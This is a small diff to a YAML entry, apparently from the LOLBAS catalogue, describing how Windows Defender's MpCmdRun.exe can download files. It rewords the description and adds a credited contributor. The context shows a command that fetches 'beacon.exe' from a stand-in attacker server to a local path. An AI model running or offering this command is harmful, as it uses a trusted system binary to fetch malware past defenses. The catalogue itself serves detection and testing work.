@@ -5,8 +5,7 @@ Author: 'Oddvar Moe'
 Created: '09/03/2020'
 Commands:
   - Command: MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\temp\\beacon.exe
-    Note: Slashes work as command line argument seperators /Downloadfile, /url, /path, as well as mixing dash and slash
-    Description: Download file to specified path
+    Description: Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path)
     Usecase: Download file
     Category: Download
     Privileges: User
@@ -43,4 +42,6 @@ Acknowledgement:
     Handle: '@mohammadaskar2'
   - Person: Oddvar Moe
     Handle: '@oddvarmoe'
+  - Person: RichRumble
+    Handle: ''
 ---
